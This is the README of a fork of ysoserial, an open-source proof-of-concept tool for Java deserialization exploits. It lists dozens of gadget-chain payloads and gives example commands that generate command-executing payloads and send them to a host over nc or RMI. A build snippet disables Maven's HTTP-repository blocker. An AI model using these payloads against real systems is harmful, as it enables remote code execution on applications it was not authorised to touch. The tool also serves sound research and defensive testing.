
# ysoserial

**Fork**: This is a fork of [https://github.com/wh1t3p1g/ysoserial](The wh1t3p1g fork) of ysoserial. The only change here so far is a modified README.md and pom.xml to allow building using modern Maven versions.


[![Join the chat at https://gitter.im/frohoff/ysoserial](
    https://badges.gitter.im/frohoff/ysoserial.svg)](
    https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## Update

* CommonsCollection8,9,10
* RMIRegistryExploit2,3
* RMIRefListener,RMIRefListener2
* PayloadHTTPServer
* Spring3

最新的相关研究已转移到[ysomap](https://github.com/wh1t3p1g/ysomap)

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        http://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar                                                                                                         ✹master
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
Feb. 02, 2024 4:56:16 PM org.reflections.Reflections scan
INFO: Reflections took 49 ms to scan 1 urls, producing 18 keys and 162 values
     Payload              Authors                                Dependencies
     -------              -------                                ------------
     BeanShell1           @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                 @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Clojure              @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1    @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1  @frohoff                               commons-collections:3.1
     CommonsCollections10 @wh1t3p1g                              commons-collections:3.2.1
     CommonsCollections2  @frohoff                               commons-collections4:4.0
     CommonsCollections3  @frohoff                               commons-collections:3.1
     CommonsCollections4  @frohoff                               commons-collections4:4.0
     CommonsCollections5  @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6  @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7  @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     CommonsCollections8  @navalorenzo                           commons-collections4:4.0
     CommonsCollections9  @wh1t3p1g                              commons-collections:3.1
     FileUpload1          @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1              @frohoff                               groovy:2.3.9
     Hibernate1           @mbechler
     Hibernate2           @mbechler
     JBossInterceptors1   @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient           @mbechler
     JRMPListener         @mbechler
     JSON1                @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1       @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21              @frohoff
     Jython1              @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1        @matthias_kaiser                       js:1.7R2
     MozillaRhino2        @_tint0                                js:1.7R2
     Myfaces1             @mbechler
     Myfaces2             @mbechler
     ROME                 @mbechler                              rome:1.0
     Spring1              @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2              @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     Spring3              @wh1t3p1g                              spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2
     URLDNS               @gebl
     Vaadin1              @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1              @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```



## Building

This repositories `pom.xml` has been updated to work with more up to date versions of Maven. 

I used Maven `3.9.61` and Java 11 (later Java versions may not work). I set the alternate JDK from the command line like so:

```
$ export JAVA_HOME=/Library/Java/JavaVirtualMachines/openjdk11-temurin/Contents/Home
```

Compile as follows:

```mvn clean package -DskipTests```


The following may be needed in the Maven configuration file `~/.m2/settings.xml` to allow access to blocked repositories.

```
<settings xmlns="http://maven.apache.org/SETTINGS/1.2.0"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.2.0 http://maven.apache.org/xsd/settings-1.2.0.xsd">
   <mirrors>
        <mirror>
            <id>maven-default-http-blocker</id>
            <mirrorOf>external:dont-match-anything-mate:*</mirrorOf>
            <name>Pseudo repository to mirror external repositories initially using HTTP.</name>
            <url>http://0.0.0.0/</url>
            <blocked>false</blocked>
        </mirror>
    </mirrors>
</settings>
```



## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
